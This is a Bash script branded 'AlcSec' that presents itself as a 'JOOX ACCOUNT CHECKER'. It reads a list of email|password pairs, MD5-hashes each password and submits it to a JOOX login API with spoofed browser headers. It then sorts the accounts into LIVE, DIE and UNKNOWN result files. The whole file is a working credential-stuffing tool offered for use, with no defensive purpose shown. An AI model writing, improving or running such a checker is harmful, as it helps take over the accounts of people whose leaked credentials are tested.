#!/bin/bash
RED='\033[0;31m'
CYAN='\033[0;36m'
YELLOW='\033[1;33m'
ORANGE='\033[0;33m'
PUR='\033[0;35m'
GRN="\e[32m"
WHI="\e[37m"
NC='\033[0m'

echo ""
printf "   $WHI ============================================================ \n"
printf "   $GRN#       $RED█████╗ ██╗      ██████╗███████╗███████╗ ██████╗  $GRN	#\n"
printf "   $GRN#       $RED██╔══██╗██║     ██╔════╝██╔════╝██╔════╝██╔════╝ $GRN	#\n"
printf "   $GRN#       $RED███████║██║     ██║     ███████╗█████╗  ██║  $GRN	#\n"     
printf "   $GRN#       $RED██╔══██║██║     ██║     ╚════██║██╔══╝  ██║  $GRN	#\n"     
printf "   $GRN#       $RED██║  ██║███████╗╚██████╗███████║███████╗╚██████╗ $GRN	#\n"
printf "   $GRN#       $RED╚═╝  ╚═╝╚══════╝ ╚═════╝╚══════╝╚══════╝ ╚═════╝ $GRN	#\n"
printf "   $WHI ============================================================ \n"
printf "   $YELLOW		    	  JOOX ACCOUNT CHECKER				\n"
printf "   $WHI	============================================================ \n"
printf "\n"
printf "   $YELLOW		   	  -AlchaDecode-				\n"
printf "   $WHI ============================================================ \n"
printf "$NC\n"


# Asking user whenever the
# parameter is blank or null
  # Print available file on
  # current folder
  # clear
  read -p "Show Directory Tree(Y/n): " show
  if [[ ${show,,} == 'y' ]]; then
  echo ""
  tree
  echo ""
  fi
  read -p "Enter mailist file: " inputFile
  if [[ ! $inputFile ]]; then
  printf "$YELLOW Please input the file \n"
  exit
  fi
  if [ ! -e $inputFile ]; then
  printf "$YELLOW File not found \n"
  exit
  fi
  
  if [[ $targetFolder == '' ]]; then
  read -p "Enter target folder: " targetFolder
  # Check if result folder exists
  # then create if it didn't
  if [[ ! $targetFolder ]]; then
  echo "Creating Hasil/ folder"
    mkdir Hasil
    targetFolder="Hasil"
  fi
  if [[ ! -d "$targetFolder" ]]; then
    echo "Creating $targetFolder/ folder"
    mkdir $targetFolder
  else
    read -p "$targetFolder/ folder exists, append to them?(Y/n): " isAppend
    if [[ $isAppend == 'n' ]]; then
    printf "$YELLOW == Thanks For Using AlcSec == \n"
      exit
    fi
  fi
else
  if [[ ! -d "$targetFolder" ]]; then
    echo "Creating $targetFolder/ folder"
    mkdir $targetFolder
  fi
fi
totalLines=`grep -c "@" $inputFile`
con=1
printf "$CYAN=================================\n"
printf "$YELLOW       CHECKING PROCESS\n"
printf "$CYAN=================================\n"
check(){
md5=$2
hash="$(echo -n "$md5" | md5sum | cut -d ' ' -f 1)"
login=$(curl -s 'http://api-jooxtt.sanook.com/web-fcgi-bin/web_wmauth?callback=callBackEmailAuth&country=id&lang=zh_TW&authtype=2&wxopenid='$1'&password='$hash'' -H 'User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.87 Safari/537.36' -H 'Referer: http://www.joox.com/id/en/mymusic' -H 'Origin: http://www.joox.com' --compressed);
 if [[ $login == *'callBackEmailAuth({"code":'* ]];then
        printf "$RED [ DIE ] $ORANGE[$header] $PUR[ ./Alchmst] \n";
        echo "[DIE] $1|$2 - $login" >> $3/ResultJooxDie.tmp
    elif [[ $login == *'callBackEmailAuth({"city":'* ]];then
        printf "$GRN [ LIVE ] $ORANGE[$header] $PUR[ ./Alchmst] \n";
        echo "[LIVE] $1|$2 - $login">> $3/ResultJooxLive.tmp
    else 
        echo $login;
        echo "[UNKNOWN] $1|$2 - $login">> $3/ResultJooxUnknown.tmp
    fi
}

SECONDS=0
for mailpass in $(cat $inputFile); do
	email=$(echo $mailpass | cut -d "|" -f 1)
	pass=$(echo $mailpass | cut -d "|" -f 2)
	indexer=$((con++))
	printf "$CYAN $totalLines/$indexer $NC $email|$pass - "
	check $email $pass $targetFolder
done
duration=$SECONDS

printf "$YELLOW $(($duration / 3600)) hours $(($duration / 60)) minutes and $(($duration % 60)) seconds elapsed. \n"
printf "$YELLOW=============== AlcSec - AlchaDecode =============== \n"
